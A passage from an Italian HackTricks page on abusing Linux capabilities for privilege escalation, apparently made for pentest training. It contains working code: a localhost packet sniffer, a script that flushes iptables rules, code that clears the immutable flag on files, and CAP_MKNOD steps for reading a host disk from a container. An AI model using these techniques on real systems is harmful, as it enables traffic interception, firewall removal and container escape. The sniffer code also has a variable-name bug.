L'esempio seguente è un codice **`python2`** che può essere utile per intercettare il traffico dell'interfaccia "**lo**" (**localhost**). Il codice proviene dal laboratorio "_The Basics: CAP-NET\_BIND + NET\_RAW_" da [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

La capacità [**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) concede al possessore il potere di **modificare le configurazioni di rete**, inclusi le impostazioni del firewall, le tabelle di routing, i permessi dei socket e le impostazioni dell'interfaccia di rete all'interno dei namespace di rete esposti. Consente inoltre di attivare la **modalità promiscua** sulle interfacce di rete, consentendo di intercettare i pacchetti attraverso i namespace.

**Esempio con un binario**

Supponiamo che il **binario python** abbia queste capacità.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Questo significa che è possibile modificare gli attributi dell'inode.** Non è possibile ottenere direttamente privilegi di escalation con questa capacità.

**Esempio con un binario**

Se scopri che un file è immutabile e Python ha questa capacità, puoi **rimuovere l'attributo di immutabilità e rendere il file modificabile:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Nota che di solito questo attributo immutabile viene impostato e rimosso usando:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente l'esecuzione della chiamata di sistema `chroot(2)`, che potenzialmente permette di evadere gli ambienti `chroot(2)` attraverso vulnerabilità conosciute:

* [Come evadere da diverse soluzioni chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: strumento di evasione chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) non solo consente l'esecuzione della chiamata di sistema `reboot(2)` per riavviare il sistema, inclusi comandi specifici come `LINUX_REBOOT_CMD_RESTART2` adattati a determinate piattaforme hardware, ma consente anche l'uso di `kexec_load(2)` e, a partire da Linux 3.17, `kexec_file_load(2)` per caricare nuovi kernel di crash o kernel firmati rispettivamente.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) è stato separato dalla più ampia **CAP_SYS_ADMIN** in Linux 2.6.37, concedendo specificamente la possibilità di utilizzare la chiamata di sistema `syslog(2)`. Questa capacità consente la visualizzazione degli indirizzi del kernel tramite `/proc` e interfacce simili quando l'impostazione `kptr_restrict` è impostata su 1, che controlla l'esposizione degli indirizzi del kernel. A partire da Linux 2.6.39, il valore predefinito per `kptr_restrict` è 0, il che significa che gli indirizzi del kernel sono esposti, anche se molte distribuzioni lo impostano su 1 (nascondi gli indirizzi tranne da uid 0) o 2 (nascondi sempre gli indirizzi) per motivi di sicurezza.

Inoltre, **CAP_SYSLOG** consente di accedere all'output di `dmesg` quando `dmesg_restrict` è impostato su 1. Nonostante queste modifiche, **CAP_SYS_ADMIN** conserva la capacità di eseguire operazioni di `syslog` a causa di precedenti storici.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) estende la funzionalità della chiamata di sistema `mknod` oltre alla creazione di file regolari, FIFO (named pipes) o socket di dominio UNIX. Consente specificamente la creazione di file speciali, che includono:

- **S_IFCHR**: File speciali di carattere, che sono dispositivi come terminali.
- **S_IFBLK**: File speciali di blocco, che sono dispositivi come dischi.

Questa capacità è essenziale per i processi che richiedono la capacità di creare file di dispositivo, facilitando l'interazione diretta con l'hardware tramite dispositivi di carattere o blocco.

È una capacità predefinita di Docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Questa capacità consente di eseguire escalation di privilegi (attraverso la lettura completa del disco) sull'host, in queste condizioni:

1. Avere accesso iniziale all'host (non privilegiato).
2. Avere accesso iniziale al container (privilegiato (EUID 0) ed effettivo `CAP_MKNOD`).
3. Host e container devono condividere lo stesso namespace utente.

**Passaggi per creare e accedere a un dispositivo di blocco in un container:**

1. **Sull'host come utente standard:**
- Determina il tuo ID utente corrente con `id`, ad esempio `uid=1000(standarduser)`.
- Identifica il dispositivo di destinazione, ad esempio `/dev/sdb`.

2. **All'interno del container come `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Tornando all'host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Questo approccio consente all'utente standard di accedere e potenzialmente leggere i dati da `/dev/sdb` attraverso il container, sfruttando i namespace utente condivisi e i permessi impostati sul dispositivo.


### CAP\_SETPCAP

**CAP_SETPCAP** consente a un processo di **modificare i set di capacità** di un altro processo, consentendo l'aggiunta o la rimozione di capacità dai set effettivi, ereditabili e consentiti. Tuttavia, un processo può modificare solo le capacità che possiede nel proprio set consentito, garantendo che non possa elevare i privilegi di un altro processo oltre i propri. Gli aggiornamenti recenti del kernel hanno reso più rigide queste regole, limitando `CAP_SETPCAP` solo alla diminuzione delle capacità all'interno del proprio set consentito o di quello dei discendenti, al fine di mitigare i rischi per la sicurezza. L'utilizzo richiede di avere `CAP_SETPCAP` nel set effettivo e le capacità di destinazione nel set consentito, utilizzando `capset()` per le modifiche. Questo riassume la funzione principale e le limitazioni di `CAP_SETPCAP`, evidenziando il suo ruolo nella gestione dei privilegi e nell'incremento della sicurezza.

**`CAP_SETPCAP`** è una capacità di Linux che consente a un processo di **modificare i set di capacità di un altro processo**. Concede la possibilità di aggiungere o rimuovere capacità dai set di capacità effettivi, ereditabili e consentiti di altri processi. Tuttavia, ci sono alcune restrizioni su come questa capacità può essere utilizzata.

Un processo con `CAP_SETPCAP` **può solo concedere o rimuovere capacità che sono nel proprio set di capacità consentito**. In altre parole, un processo non può concedere una capacità a un altro processo se non possiede quella capacità stessa. Questa restrizione impedisce a un processo di elevare i privilegi di un altro processo oltre il proprio livello di privilegio.

Inoltre, nelle versioni recenti del kernel, la capacità `CAP_SETPCAP` è stata **ulteriormente limitata**. Non consente più a un processo di modificare arbitrariamente i set di capacità di altri processi. Invece, **consente solo a un processo di ridurre le capacità nel proprio set di capacità consentito o nel set di capacità consentito dei suoi discendenti**. Questo cambiamento è stato introdotto per ridurre i potenziali rischi per la sicurezza associati alla capacità.

Per utilizzare `CAP_SETPCAP` in modo efficace, è necessario avere la capacità nel proprio set di capacità effettivo e le capacità di destinazione nel proprio set di capacità consentito. È quindi possibile utilizzare la chiamata di sistema `capset()` per modificare i set di capacità di altri processi.

In sintesi, `CAP_SETPCAP` consente a un processo di modificare i set di capacità di altri processi, ma non può concedere capacità che non possiede. Inoltre, a causa di preoccupazioni per la sicurezza, la sua funzionalità è stata limitata nelle versioni recenti del kernel per consentire solo la riduzione delle capacità nel proprio set di capacità consentito o nei set di capacità consentiti dei suoi discendenti.

## Riferimenti

**La maggior parte di questi esempi sono tratti da alcuni laboratori di** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), quindi se vuoi esercitarti con queste tecniche di privilege escalation, consiglio questi laboratori.

**Altri riferimenti**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) è l'evento sulla sicurezza informatica più rilevante in **Spagna** e uno dei più importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso è un punto di incontro vivace per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**repository di HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
